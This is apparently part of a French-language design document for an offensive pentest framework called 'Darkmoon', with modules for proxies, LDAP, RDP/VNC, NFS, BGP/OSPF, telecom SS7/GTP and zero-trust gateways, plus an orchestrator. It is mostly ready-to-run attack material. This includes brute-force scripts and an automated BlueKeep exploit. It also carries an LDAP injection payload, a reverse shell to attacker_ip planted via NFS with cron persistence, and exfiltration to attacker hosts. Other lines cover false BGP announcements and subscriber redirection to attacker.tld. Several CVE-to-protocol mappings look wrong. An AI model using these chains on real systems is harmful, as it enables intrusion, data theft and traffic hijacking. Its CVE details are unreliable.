curl -x <proxy> "http://target/exfil?data=$(base64 <file>)"
```

---

## 🔁 STRATÉGIE ADAPTATIVE

```pseudo
IF is_transparent → test MITM intercept + downgrade SSL
IF allows_connect → trigger port scan & SSRF internal
IF supports_cache → try cache poisoning
IF proxy_auth_enabled → bruteforce + NTLM relay
```

---

## 🧠 MAPPING CVE / MITRE / CPE

- CVE-2021-28116 (Squid): cache poisoning
- CVE-2020-25097 (Bluecoat ProxySG): header parsing bypass
- MITRE ATT&CK : T1071.001, T1040, T1557.001 (SSL MiTM)

---

## 📂 OUTPUTS

```plaintext
/output/network/http_proxy/proxy_capabilities.txt
/output/network/http_proxy/cache_poison.log
/output/network/http_proxy/bruteforce_result.txt
/output/network/http_proxy/ssl_intercept_evidence.txt
```

---

## 🧰 Script Automatisé

```bash
#!/bin/bash
nmap -p3128,8080 --script http-open-proxy $1 -oN proxy_enum_$1.txt
curl -x $1:3128 https://example.com -v > ssl_test_$1.txt
proxychains nmap -sT -Pn -p80,443,22 10.0.0.0/24 -oN internal_scan_$1.txt
```

---

### 📚 MODULE : `engine_proto_ldap_external()`

```markdown
## 📡 ENGINE_PROTO_LDAP_EXTERNAL() – Audit LDAP Exposé (DMZ, services publics, proxies)

---

### 🎯 OBJECTIF

Auditer les services LDAP exposés sur Internet ou en DMZ :
- Enumération anonyme / authentifiée
- Dump objets, GPO, OU, credentials
- Abus LDAP Bind / Injection
- Reconnaissance domaine et Shadow IT

---

## 🧠 [TYPE_ABSTRAIT] LdapTarget
```plaintext
LdapTarget {
  ip: string,
  port: int,
  protocol: LDAP | LDAPS,
  auth_method: Anonymous | Simple | NTLM,
  domain: string,
  users_found: int,
  bind_success: boolean,
  supports_starttls: boolean
}
```

---

## 🧪 PHASE 1 : Enumération Anonyme

```bash
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=*)"
```

• Extraction user/group/OU  
• Vérifie bind anonymous → dump intégral si autorisé

---

## 🔐 PHASE 2 : Authentification et bruteforce

```bash
hydra -L users.txt -P rockyou.txt ldap://<target> ldap2
```

• Test comptes utilisateurs exposés (ex : service LDAP pour applications)

---

## 🧠 PHASE 3 : Extraction ciblée (si bind OK)

```bash
ldapsearch -H ldap://<target> -D "cn=user,dc=corp,dc=local" -w pass -b "dc=corp,dc=local" "(objectClass=group)"
```

• Récupère :
  - distinguishedName
  - sAMAccountName
  - memberOf
  - pwdLastSet

---

## 💉 PHASE 4 : Injection LDAP (blind ou filtrée)

• Exemple d’injection via paramètre PHP :

```bash
GET /auth.php?user=*)(uid=*))(|(uid=*
```

• Utilise `ldap-injector` ou Burp Suite (intruder mode)

---

## 🔥 PHASE 5 : Exploits spécifiques / StartTLS abuse

```bash
nmap --script ldap-rootdse,ldap-novell-getpass -p389 <target>
```

• Attaque downgrade StartTLS  
• Recherche CVE spécifiques (OpenLDAP, Novell, etc.)

---

## 🔁 STRATÉGIE ADAPTATIVE

```pseudo
IF bind_success == true AND users_found > 10:
    → Trigger brute-force + dump comptes
IF anonymous_bind == true:
    → Enum full + export LDIF
IF injection_detected:
    → Abus via intruder + LDAP filter bypass
```

---

## 🧠 MAPPING CVE / MITRE / CPE

- CVE-2020-25709 (OpenLDAP bind crash)
- CVE-2020-1183 (Active Directory bind bypass)
- MITRE ATT&CK : T1586.002, T1078.002 (LDAP enumeration abuse)

---

## 📂 OUTPUTS

```plaintext
/output/network/ldap_external/ldap_enum.ldif
/output/network/ldap_external/bind_success_users.txt
/output/network/ldap_external/injection_results.log
```

---

## 🧰 Script Automatisé

```bash
#!/bin/bash
ldapsearch -x -H ldap://$1 -b "dc=corp,dc=local" "(objectClass=*)" > ldap_enum.ldif
hydra -L users.txt -P rockyou.txt ldap://$1 ldap2 -o ldap_brute.txt
```

---

### 🖥️ MODULE : `engine_proto_rdp_vnc()`

```markdown
## 🧠 ENGINE_PROTO_RDP_VNC() – Pentest des Accès Distants (RDP / VNC)

---

### 🎯 OBJECTIF

Auditer les accès distants exposés sur le réseau interne ou externe :
- Fingerprint RDP & VNC
- Authentification bruteforce
- Détection de vulnérabilités (BlueKeep, etc.)
- Abus de clipboard, shared drive, injection à distance

---

## [TYPE_ABSTRAIT] RemoteDesktopTarget
```plaintext
RemoteDesktopTarget {
  ip: string,
  protocol: RDP | VNC,
  version: string,
  auth_type: None | NTLM | Certificate,
  clipboard_enabled: boolean,
  drive_share_enabled: boolean,
  is_vulnerable: [CVE],
  brute_result: AuthSuccess | AuthFail
}
```

---

## 🔍 PHASE 1 : Fingerprinting Services

```bash
nmap -p3389 --script rdp-enum-encryption <target>
nmap -p5900 --script vnc-info <target>
rdpscan <target>
```

• Identifie versions, authentification RDP  
• VNC info : challenge-based auth, RealVNC, UltraVNC, etc.

---

## 🔓 PHASE 2 : Bruteforce d’accès

```bash
hydra -t 4 -V -f -L users.txt -P rockyou.txt rdp://<target>
patator rdp_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=rockyou.txt

hydra -s 5900 -P rockyou.txt <target> vnc
```

• Capture de succès dans un log centralisé  
• Capture de screenshots (si outils disponibles)

---

## 🚨 PHASE 3 : Exploit CVE / Vulnérabilités

• RDP : CVE-2019-0708 (BlueKeep)

```bash
msfconsole → use exploit/windows/rdp/bluekeep_rce
```

• VNC : Auth bypass (CVE-2020-26116), buffer overflows

```bash
nmap -p5900 --script vnc-brute,vnc-info <target>
```

---

## 📋 PHASE 4 : Abus des Fonctions Graphiques

• Clipboard hijack avec `xfreerdp` :

```bash
xfreerdp /v:<target> /u:<user> /p:<pass> +clipboard
```

• Injection fichier via partages / reverse shell :

```bash
xfreerdp /drive:loot,/tmp/payloads /v:<target>
```

• TSCon hijack sur hôte compromis :

```cmd
tscon <session_id> /dest:console
```

---

## 🔁 STRATÉGIE ADAPTATIVE

```pseudo
IF port 3389 open AND rdp_version detected:
    → trigger BlueKeep test + brute RDP
IF port 5900 open AND VNC challenge-response:
    → test weak auth + screenshot grabber
IF clipboard OR drive_share enabled:
    → plan payload exfil via session abuse
```

---

## 🧠 MAPPING CVE / MITRE / CPE

- CVE-2019-0708 (BlueKeep)
- CVE-2020-26116 (VNC auth bypass)
- MITRE ATT&CK : T1021.001, T1021.005, T1218.010

---

## 📂 OUTPUTS

```plaintext
/output/network/rdp_vnc/rdp_fingerprint.log
/output/network/rdp_vnc/brute_results.txt
/output/network/rdp_vnc/vnc_screenshots/
```

---

## 🧰 Script Automatisé

```bash
#!/bin/bash
nmap -p3389 --script rdp-enum-encryption $1 -oN rdp_enum_$1.txt
hydra -L users.txt -P rockyou.txt rdp://$1 -o rdp_brute_$1.txt
msfconsole -x "use exploit/windows/rdp/bluekeep_rce; set RHOSTS $1; run"
```

---


### 📦 MODULE : `engine_proto_nfs_afp()` — Audit des services de fichiers Unix-like (NFS, AFP)

---

#### 🎯 OBJECTIF :
Ce module cible les services de partage de fichiers NFS (Network File System) et AFP (Apple Filing Protocol). Il permet l'identification de partages non sécurisés, d’anonymes mounts, d’escalades via `root_squash` mal configuré, ainsi que la détection de fichiers sensibles accessibles à distance.

---

### 🧱 STRUCTURE DU MODULE (TYPAGE ABSTRAIT)

```plaintext
FileShareTarget {
    ip: string,
    port: int,
    service: NFS | AFP,
    mountable: boolean,
    has_anonymous_access: boolean,
    exported_paths: [string],
    access_rights: [Read | Write | Execute],
    sensitive_files: [string],
    root_squash: boolean,
    weak_acl_detected: boolean
}
```

---

## 🔎 1️⃣ PHASE DE DÉTECTION — SCAN NFS / AFP

```bash
# Scan des partages NFS
nmap -p 2049 --script=nfs-showmount,nfs-statfs,nfs-ls <target>

# Alternative : showmount
showmount -e <target>

# Scan AFP (Apple Filing Protocol)
nmap -p 548 --script afp-showmount,afp-brute <target>
```

---

## 📂 2️⃣ ENUMÉRATION DES MONTAGES EXPORTÉS

```bash
# Extraction de la liste des exportations
showmount -e <target>

# Tentative de montage anonyme
mkdir /tmp/mount; mount -t nfs <target>:<exported_path> /tmp/mount

# Scan contenu
ls -alh /tmp/mount/
```

---

## 🧪 3️⃣ TESTS DE DROITS & PRIVILÈGES

```bash
# Test écriture
touch /tmp/mount/pentest_test.txt

# Évaluation du root_squash (peut empêcher UID 0 d’avoir les droits root)
cat /etc/exports   # local, si accès
```

---

## 🧬 4️⃣ CVE + MITRE Mapping

- **CVE-2010-2062** : NFSv4 root_squash bypass vuln
- **CVE-2017-7494** : Arbitrary shared object load via NFS (samba-nfs LPE)
- **CVE-2020-14370** : kernel/NFS LPE
- **Tactics** :
  - T1021.002 : Remote File Copy (NFS)
  - T1039 : Data from Network Shared Drive
  - T1071.001 : Application Layer Protocol (AFP)

---

## 🔐 5️⃣ ABUS

```bash
# Injection de payloads si écriture permise
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/mount/.shell.sh

# Persistance via cron si accessible
echo "* * * * * root /tmp/mount/.shell.sh" >> /tmp/mount/etc/crontab
```

---

## 🔥 6️⃣ POST-EXPLOITATION & EXFILTRATION

```bash
# Extraction de fichiers sensibles
grep -r 'password\|passwd\|secret\|conf' /tmp/mount/

# Exfiltration
scp /tmp/mount/confidential.txt user@attacker:/loot/nfs/
```

---

## 🛠️ OUTILS

- `nmap`, `showmount`, `mount`, `nfs-common`
- `afpfs-ng`, `afp-client`, `afp-brute`
- `grep`, `scp`, `netcat`

---

## 🧾 OUTPUTS

```plaintext
/output/network/nfs_afp/<target>/mount_list.txt
/output/network/nfs_afp/<target>/write_test.log
/output/network/nfs_afp/<target>/exfiltrated_files/
```

---

### 📦 MODULE : `engine_proto_bgp_ospf()` — Audit des protocoles de routage (Border Gateway Protocol / Open Shortest Path First)

---

#### 🎯 OBJECTIF :
Ce module cible les protocoles de routage internes (OSPF) et inter-domaine (BGP), critiques dans les infrastructures ISP, datacenters, et cloud hybrides. Il détecte les configurations faibles, l’absence d’authentification MD5/TTL-hopping, les détournements de route (route hijacking) et les vulnérabilités exploitées dans les attaques BGP leak / OSPF poisoning.

---

### 🧱 STRUCTURE DU MODULE (TYPAGE ABSTRAIT)

```plaintext
RouteProtocolTarget {
    ip: string,
    protocol: BGP | OSPF,
    version: string,
    open_port: int,
    has_md5_auth: boolean,
    ttl_hop_protection: boolean,
    neighbors: [string],
    as_number: string,
    routes_advertised: [string],
    routes_received: [string],
    hijack_risk: boolean,
    poisoning_possible: boolean
}
```

---

## 🔎 1️⃣ PHASE DE DÉTECTION — SCAN PRÉLIMINAIRE

```bash
# BGP - Port 179
nmap -p179 --script bgp-info <target>

# OSPF - IP protocol 89
sudo nmap -sO -p 89 <target> --script ospf-info

# Analyse TTL
hping3 -S <target> -p 179 --ttl 1  # Test TTL protection
```

---

## 🧭 2️⃣ ENUMÉRATION DE LA TOPOLOGIE ROUTAGE

```bash
# bgpctl / zebra / bird CLI (si accès routeur via telnet/SSH)
bgpctl show neighbor
bgpctl show rib

# Exfiltration route table (sur Zebra/Bird/Quagga vulnérable)
telnet <router_ip> 2605
```

---

## 🔐 3️⃣ TESTS D’ABUS / HIJACK / POISONING

```bash
# Fake Router Emulation - BGP/OSPF replay with Scapy / ExaBGP
python exabgp.py bgp-hijack.conf

# OSPF Poisoning Tooling
ospflood.py -i eth0 -t 224.0.0.5 -r 5

# MITM possible via route redirection
tcpdump -nni eth0 port 179 or ip proto 89
```

---

## 🧬 4️⃣ CVE + MITRE Mapping

- **CVE-2018-0171** : Cisco IOS XE – BGP parser bug → RCE
- **CVE-2017-6736** : OSPF LSA handling → DoS
- **CVE-2021-34730** : BGP update vulnerability → Hijack
- **Tactics MITRE** :
  - T1190 : Exploit Public-Facing Application (BGP)
  - T1583.004 : Hijack Network Infrastructure
  - T1020 : Route Manipulation (OSPF)

---

## ⚔️ 5️⃣ POST-EXPLOITATION ROUTAGE

```bash
# Annonce de faux préfixes
echo 'announce route 10.0.0.0/8 next-hop <attacker_ip>' | exabgpcli

# Redirection de trafic ciblé vers attaque MITM ou relais DNS
```

---

## 📊 6️⃣ SURVEILLANCE & MITIGATION

```bash
# Surveillance BGP/OSPF route anomalies
bgpq3 -h whois.radb.net AS<target> | diff routes.txt -

# Vérification RPKI (BGP) + route filtering
```

---

## 🛠️ OUTILS

- `nmap`, `hping3`, `exabgp`, `bgpq3`, `tcpdump`
- `ospflood`, `Scapy`, `bird`, `quagga`

---

## 🧾 OUTPUTS

```plaintext
/output/network/bgp_ospf/<target>/neighbors_map.txt
/output/network/bgp_ospf/<target>/route_hijack_attempts.log
/output/network/bgp_ospf/<target>/ospf_poison_report.md
```

---

### 📦 MODULE : `engine_proto_telco_infra()` — Analyse des infrastructures télécoms (SS7 / GTP / DIAMETER / LTE)

---

#### 🎯 OBJECTIF :
Auditer et abuser les protocoles télécoms utilisés dans les réseaux mobiles 2G/3G/4G/5G, opérateurs MVNO/MNO, roaming, et infrastructures IMS/VoLTE. Détection des vecteurs d’attaque : interception d’appels/SMS, DoS sur subscribers, usurpation IMSI, abus roaming, et tunneling GTP non-authentifié.

---

### 🧱 STRUCTURE DU MODULE (TYPAGE ABSTRAIT)

```plaintext
TelcoTarget {
    ip: string,
    port: int,
    operator_name: string,
    ss7_enabled: boolean,
    gtpc_open: boolean,
    gtpv2_support: boolean,
    diameter_enabled: boolean,
    hss_exposed: boolean,
    roaming_paths: [string],
    imsi_ranges: [string],
    auth_bypass_possible: boolean,
    cve_detected: [string]
}
```

---

## 🔎 1️⃣ PHASE DE DÉTECTION PRÉLIMINAIRE

```bash
# Scan SS7 (Port 2905, M3UA / SUA)
nmap -sS -p2905 <target> --script ss7-info

# Scan GTP (Port 2123 - GTP-C / Port 2152 - GTP-U)
sudo nmap -sU -p2123,2152 <target>

# Scan DIAMETER (Port 3868)
nmap -sS -p3868 <target> --script diameter-info
```

---

## 🔄 2️⃣ ENUMÉRATION IMSI / GTP / DIAMETER

```bash
# GTPScan
gtpscan -t <target> -p 2123

# IMSI-Catcher + LTE-Sniffing (SDR/RTL-SDR)
gr-gsm_livemon
imsilookup --mcc 208 --mnc 10

# DIAMETER Walk
diameterdump -i eth0 -p 3868

# SS7 Mapping (if routed access)
ss7map --host <target>
```

---

## 🛠️ 3️⃣ TESTS D’ABUS CLASSIQUES

```bash
# IMSI Paging Attack
ss7_send.py --imsi 208101234567890 --type PAGING

# Location Update Spoof
ss7_locupdate.py --imsi <target_imsi> --cellid 0101 --mccmnc 20810

# GTP Tunnel Hijack (IPv4 payload inject)
gtp-injector --target <target> --tun-ip 10.0.0.10 --payload data.bin

# DIAMETER Auth Bypass Replay
diameter-replay.py --mode auth --user=alice --target=<target>
```

---

## 🧬 4️⃣ CVE + MITRE Mapping

- **CVE-2021-21778** : DIAMETER DoS parsing
- **CVE-2020-26575** : GTP invalid session injection
- **CVE-2019-11364** : SS7 SCCP Remote DoS
- **CVE-2022-24637** : GTPv2 payload abuse

- **MITRE TTPs** :
  - T1557.003 : Adversary-in-the-Middle via VoLTE
  - T1586 : Subscriber Spoofing
  - T1008 : Falsification of Mobile Identity (IMSI)

---

## 🧬 5️⃣ POST-EXPLOITATION EXEMPLES

```bash
# Tunnel de données sans autorisation
gtp-tunnel.py --tun-if tun0 --spoof-imsi 20810XXXXXX

# Injection de session vers PCRF
diameter_attack.py --inject-session=malicious.id --service internet

# Redirection d’un mobile vers serveur malveillant
ss7_sgsn_redirect.py --imsi --new_apn attacker.tld
```

---

## 🛠️ OUTILS

- `gtpscan`, `gr-gsm`, `ss7map`, `ss7_send.py`, `diameterdump`
- `imsilookup`, `rtl_sdr`, `gtp-injector`, `diameter-replay`
- `docker-volte-lab`, `Wireshark` with LTE/DIAMETER dissectors

---

## 📦 SCRIPTING

```plaintext
telco_enum.sh → scan + IMSI dump
telco_attack.sh → hijack + ss7 exploit
diameter_spoof.bat → replay auth
```

---

## 🧾 OUTPUTS

```plaintext
/output/network/telco/<target>/imsi_list.txt
/output/network/telco/<target>/gtp_tunnels.log
/output/network/telco/<target>/ss7_attacks.md
/output/network/telco/<target>/diameter_auth_bypass.flag
```

---

### 🛡 MODULE : `engine_proto_zerotrust()` — Analyse des architectures ZTNA / SASE / SSO segmentés

---

#### 🎯 OBJECTIF :

Analyser, détourner, et abuser des mécanismes Zero Trust :
- SSO (SAML/OAuth2/OIDC)
- Reverse proxy ZTNA
- Bastion jumpbox
- Network segmentation / identity-based rules
- SDP (Software Defined Perimeter)

Ce module vise à pénétrer les accès conditionnels, à déchiffrer les flux ZTNA, à tester les mécanismes de segmentation dynamique, à simuler des attaques latérales malgré l’isolation, et à abuser des configurations faibles sur les proxys d’accès, gateways, brokers ou contrôleurs d’identité.

---

### 🧱 STRUCTURE TYPÉE

```plaintext
ZTNATarget {
    ip: string,
    fqdn: string,
    sso_provider: string,
    sdp_gateway: boolean,
    access_proxy: boolean,
    identity_context: [string],
    conditional_access_rules: [string],
    redirect_flows: [URL],
    header_injection_possible: boolean,
    identity_mapping_vulnerable: boolean,
    bastion_present: boolean,
    audit_logging_enabled: boolean
}
```

---

## 🔎 1️⃣ PHASE DE DÉTECTION & ENUM ZTNA

```bash
# Analyse DNS / subdomain / wildcard
subfinder -d <domain>
dnsx -a -resp -d <domain>

# SAML / OIDC / OAuth fingerprint
nuclei -u <fqdn> -t nuclei-templates/sso
curl -I <fqdn>/login | grep location

# Analyse du broker ZTNA
httpx -title -tech-detect -status-code <fqdn>

# Bastion detection (Azure Bastion, Teleport, etc.)
nmap -p443 --script ssl-cert --script-args ssl-cert.subject.cn="<fqdn>"
```

---

## 🔁 2️⃣ RECONNAISSANCE IDENTITÉ & SEGMENTATION

```bash
# JWT manipulation
jwt_tool.py <jwt_token> -C -T -d jwks.json

# Header injection test
curl -H "X-Forwarded-User: admin" -H "X-Auth-Token: fake" https://<fqdn>

# Detection de bypass via routes cachées
dirsearch -u https://<fqdn> -w routes.txt
```

---

## 🧬 3️⃣ TESTS DE BYPASS / ABUS DE POLITIQUE

```bash
# SAML request tampering
python saml-burp-injector.py --url https://<fqdn>/saml --edit-attributes

# OAuth token poisoning
python oidc-token-poisoner.py --redirect-uri=https://malicious.site

# Forced browsing via reverse proxy
curl -H "Host: internal.service" https://proxy.<fqdn>/api

# Abuse de bastion
ssh user@bastion.<fqdn> -J admin@pivot --agent-forwarding
```

---

## 🔓 4️⃣ CVE / MITRE Mapping

- **CVE-2022-26923** — Azure AD Token Handling Weakness
- **CVE-2021-21985** — vSphere / Proxy Auth Bypass
- **CVE-2020-2100** — Jenkins reverse proxy injection
- **CVE-2021-33742** — SAML Signature Wrapping

- **MITRE ATT&CK TTPs**
  - T1552.007 (Forge Web Credentials)
  - T1078.004 (Cloud Identity Abuse)
  - T1134.002 (Token Impersonation)
  - T1190 (Reverse Proxy Exploit)

---

## 🧠 5️⃣ POST-EXPLOITATION & PERSISTENCE

```bash
# Identity hijacking
impacket-ticketconverter valid.kirbi --format jwt

# Reverse shell via bastion bounce
ssh -R 4444:localhost:22 attacker@pivot

# Credential injection via headers
Burp → repeater → inject "X-Email: admin@target.local"

# Backdoor SDP route
ZTNA_policy_editor.py --add-allow-rule "source:any → target:admin.internal"
```

---

## 🔧 OUTILS UTILISÉS

- `jwt_tool.py`, `nuclei`, `dirsearch`, `httpx`, `ssrfmap`
- `samltoolkit`, `oidc-token-poisoner`, `BurpSuite Pro`, `mitmproxy`
- `impacket`, `ZTNA_policy_editor.py`, `Teleport`, `StrongDM`, `BeyondCorp`

---

## 📦 SCRIPTING

```plaintext
ztna_enum.sh → fingerprint + subdomain + proxy
ztna_authbypass.sh → jwt/saml tampering
ztna_bastion_lateral.sh → ssh chain + forward
ztna_persistence.sh → rewrite sdp rules + token injection
```

---

## 📁 OUTPUTS

```plaintext
/output/network/ztna/<target>/fingerprints.md
/output/network/ztna/<target>/bypass_attempts.log
/output/network/ztna/<target>/abused_tokens.json
/output/network/ztna/<target>/lateral_routes.graph
```

---

### 🛠 MODULE : `engine_proto_icmp_tunnel()` — Exfiltration furtive via protocoles ICMP

---

## 🎯 OBJECTIF :

Permettre une exfiltration ou communication bidirectionnelle dissimulée via paquets ICMP (Echo Request/Reply), souvent autorisés même dans des environnements hautement filtrés. Tester la faisabilité d’un **tunnel complet** via des outils spécialisés, contourner les firewalls, et évaluer la détection EDR/NIDS.

---

## 🧱 STRUCTURE TYPE ABSTRAIT

```plaintext
ICMPExfilTarget {
    ip: string,
    os: string,
    icmp_allowed: boolean,
    egress_blocked: boolean,
    edr_detectable: boolean,
    user_access: boolean,
    shell_access: boolean,
    tunneled_files: [string],
    covert_channel_ready: boolean
}
```

---

## 🔍 1️⃣ PHASE DE DÉTECTION & PRÉCONDITIONS

```bash
# Test ICMP reachability
ping -c 4 <target>
nping --icmp <target>

# Port mirroring to check EDR/NIDS
tcpdump -i eth0 icmp

# Firewall/egress ICMP test
hping3 -1 <target> -c 3 --icmptype 8
```

---

## 📡 2️⃣ OUTILLAGE & CONFIGURATION DE TUNNELS

### ➤ **Icmptunnel** (Linux → Linux)

```bash
# SERVER
icmptunnel -s -i tun0
# CLIENT
icmptunnel -c <target> -i tun0
```

### ➤ **PingTunnel**

```bash
# SERVER
sudo ptunnel -x secretpw
# CLIENT
sudo ptunnel -p <server_ip> -lp 8080 -da <dest_ip> -dp 80
```

### ➤ **DNScat2 fallback (si ICMP bloqué)**

```bash
# Covert fallback channel
dnscat2-server.rb
dnscat2-client <domain>
```

---

## 🚨 3️⃣ TEST D'EXFILTRATION

```bash
# Envoi de fichiers segmentés via ICMP
covert_icmp.sh -f secret.zip -t <target>

# Ouverture de shell via icmpsh
python icmpsh_m.py <attacker_ip> <target>
```

---

## 🔒 4️⃣ DÉTECTION, ANOMALIES & ANALYSE

```bash
# Analyse réseau sur host
Wireshark → filtre : icmp and data.len > 0

# Detection signature Snort
alert icmp any any -> any any (msg:"ICMP Exfil detected"; content:"data"; sid:1000001; rev:1;)

# AV test (EICAR via tunnel)
echo "X5O!P%@AP[4\PZX54(P^)7CC)7}" > test.txt
tunnel → transfert → AV check
```

---

## 🧠 5️⃣ MAPPING MITRE ATT&CK

- **T1048.003** : Exfiltration Over Alternative Protocol (ICMP)
- **T1095** : Non-Application Layer Protocol
- **T1568.002** : Dynamic Resolution (pour fallback DNS)

---

## 🧰 OUTILS IMPLIQUÉS

- `icmptunnel`, `ptunnel`, `icmpsh`, `dnscat2`
- `tcpdump`, `nping`, `hping3`
- `Wireshark`, `Snort`, `Suricata`
- Scripts maison : `covert_icmp.sh`, `icmp_transfer.ps1`

---

## 🛠 SCRIPTING EXEMPLE

```bash
icmp_tunnel_setup.sh → config icmptunnel
icmp_file_push.sh → découpé, injecté
icmp_shell.sh → init shell reverse ICMP
icmp_monitor_snort.sh → monitor rules
```

---

## 📁 OUTPUTS

```plaintext
/output/network/icmp/<target>/icmp_rtt.txt
/output/network/icmp/<target>/covert_transfer.log
/output/network/icmp/<target>/tunnel_session.pcap
/output/network/icmp/<target>/edr_trigger_check.md
```

---

**Bloc 2/6** → Moteur `engine_infra_network()` + logique de déclenchement modulaire.

### ⚙️ BLOC 2/6 – `engine_infra_network()` : Moteur principal d’orchestration réseau

---

```plaintext
MODULE CENTRAL : engine_infra_network(target: NetworkTarget)

OBJECTIF :
Déclenchement conditionnel des modules réseau selon les ports/services détectés.
Analyse CPE/CVE/MITRE, génération de scripts par protocole, adaptation outillage (Linux/Win/Darkmoon).
```

---

### 🔁 STRATÉGIE D’ORCHESTRATION :

```plaintext
def engine_infra_network(target):
  │
  ├─ [1] Reconnaissance initiale :
  │   ├─ nmap -sS -sV -O -p- <target>
  │   ├─ rustscan <target>
  │   ├─ masscan (si plage large)
  │   ├─ amass / subfinder (si domaine DNS public)
  │
  ├─ [2] Pattern Matching Ports/Protocoles :
  │   ├─ Port 53     → engine_proto_dns()
  │   ├─ Port 21     → engine_proto_ftp()
  │   ├─ Port 445    → engine_proto_smb_network()
  │   ├─ Port 22/23  → engine_proto_ssh_telnet()
  │   ├─ Port 161    → engine_proto_snmp()
  │   ├─ Port 25/110/143/587 → engine_proto_mail_services()
  │   ├─ Port 5060   → engine_proto_voip()
  │   ├─ Port 1194/443/500   → engine_proto_vpn_access()
  │   ├─ Port 80/443 → engine_proto_http_proxy()
  │   ├─ Port 389    → engine_proto_ldap_external()
  │   ├─ Port 3389/5900 → engine_proto_rdp_vnc()
  │   ├─ Port 2049   → engine_proto_nfs_afp()
  │   ├─ Protocoles BGP/OSPF détectés → engine_proto_bgp_ospf()
  │   ├─ Ping anomalies / TTL / taille → engine_proto_icmp_tunnel()
  │
  ├─ [3] Détection Spécifique :
  │   ├─ SSID / WPA2 / PMKID → engine_proto_wifi()
  │   ├─ SS7 / Diameter (mobile) → engine_proto_telco_infra()
  │   ├─ Modèle ZeroTrust (ZTNA) → engine_proto_zerotrust()
  │
  ├─ [4] Déclenchement des sous-modules :
  │   ├─ Appels directs des engine_proto_* basés sur les résultats
  │   └─ Génération de commandes adaptées + log + réactivité

  ├─ [5] Analyse croisée :
  │   ├─ Corrélation CPE ↔ CVE ↔ MITRE
  │   ├─ Attribution de TTP
  │   └─ Scoring dynamique selon criticité

  ├─ [6] Génération de scripts :
  │   ├─ shell / batch selon environnement
  │   ├─ log naming : /output/network/<module>/<ip>/timestamp.log

  └─ [7] Rapport final :
      ├─ TTP Mapping (MITRE)
      ├─ Graphe de dépendances
      ├─ Tableau ASCII vulnérabilités
      └─ Remédiation / Patchs / CVSS
```

---



### 🧭 – Menu CLI interactif & mapping dynamique

---

#### 🔘 Menu CLI simulé :

```plaintext
┌────────────────────────────┐
│    DARKMOON NETWORK CLI    │
└────────────────────────────┘
Target: 192.168.56.0/24
Topology: LAN (Mixed)
Detected Services:
[✔] DNS       [✔] SMB        [✘] WiFi
[✔] VPN       [✔] SNMP       [✔] RDP

Available Modules:
[1] engine_proto_dns()
[2] engine_proto_smb_network()
[3] engine_proto_vpn_access()
[4] engine_proto_snmp()
[5] engine_proto_rdp_vnc()

[ALL] Lancer toute la chaîne
[MAP] Voir la topologie vulnérabilités
[REPORT] Générer rapport markdown/pdf

> Select module(s) or type ALL:
```

---

#### 🔁 Analyse dynamique

Chaque appel de `engine_proto_*` produit :
- 🧠 Une analyse heuristique locale
- ⚙️ Une exécution des scans + exploit possibles
- 📂 Génération de logs
- 🧠 Apprentissage adaptatif pour corréler avec les autres modules

---

#### 🗺️ Corrélation topologique (exemple dynamique) :

```plaintext
Réseau :
  192.168.56.1 → Port 53 (DNS)       → CVE-2020-1350 (SIGRed)
  192.168.56.2 → Port 445 (SMB)      → EternalBlue / GPP
  192.168.56.3 → Port 1194 (OpenVPN) → Bruteforce, session hijack

Corrélation :
→ 445 exposé + VPN exploité → pivot RDP possible sur 192.168.56.10
→ LDAP accessible depuis SMB + Anonymous → lateral possible
→ SNMPv1 anonymous + RDP ouvert = Enum utilisateurs distants
```

---
### 📊 – Orchestration multi-modules, scoring CVSS, génération des scripts

---

#### 🔄 `engine_infra_network_orchestrator()`

```plaintext
MODULE FINAL : Orchestrateur Heuristique Réseau
Objectif : orchestrer tous les modules engine_proto_* en fonction des patterns détectés, et exécuter dynamiquement des chaînes d’attaque, de scan ou d’exploitation selon les scénarios MITRE ↔ CVE ↔ CPE.

def engine_infra_network_orchestrator(target):

  [1] Reconnaissance initiale
    └─ Scanner tous les ports TCP/UDP avec fingerprint
    └─ Extraire services actifs (DNS, FTP, RDP...)

  [2] Moteur de corrélation :
    ├─ Mapper CPE → CVE avec nmap/whatweb/httpx/wappalyzer
    ├─ Identifier famille de vulnérabilités :
         - brute force (FTP, RDP, VPN)
         - exfil (ICMP, SMB, DNS tunnel)
         - vulnérabilité logicielle (ex: CVE-2017-0144)

  [3] Scoring & Hiérarchisation :
    ├─ CVSSv3 score via NVD
    ├─ TTP via MITRE ATT&CK
    ├─ Pondération via surface d’exposition

  [4] Déclenchement conditionnel des modules :
    ├─ si port 445 et OS WindowsServer :
         → trigger SMB_ENUM + vulnérabilités MS17-010
    ├─ si port 1194 (OpenVPN) :
         → test bruteforce, session hijack, leak
    ├─ si port 161 (SNMPv1) :
         → public string? → Enum full infra

  [5] Génération des scripts :
    ├─ Script shell/batch nommé par module + cible
    ├─ Log dans : /output/network/<module>/<target>/<ts>.log

  [6] Phase d'exploitation intelligente :
    ├─ Détection de pivot possible (ex : VPN+SMB)
    ├─ Enchaînement logique RDP bruteforce → exfil

  [7] Finalisation :
    ├─ Export Markdown + CLI replay
    ├─ Recommandations correctives + lien CVE
    └─ Graphe TTP SVG/DOT
```

---

#### 🧠 Exemple de corrélation heuristique :

```plaintext
Cible 1 : 192.168.88.12
→ Port 53 DNS → CVE-2020-1350 (SIGRed)
→ Port 445 SMB → MS17-010
→ Port 3389 RDP → No NLA

➡️ Pattern : pivot DNS → SMB → RDP
➡️ TTP : MITRE T1046, T1021, T1210
➡️ CVSS : 10.0 (critique)

📂 Script suggéré : full_chain_dns_smb_rdp.sh
📁 Output : /output/network/pivot_chain/192.168.88.12/full.log
```

---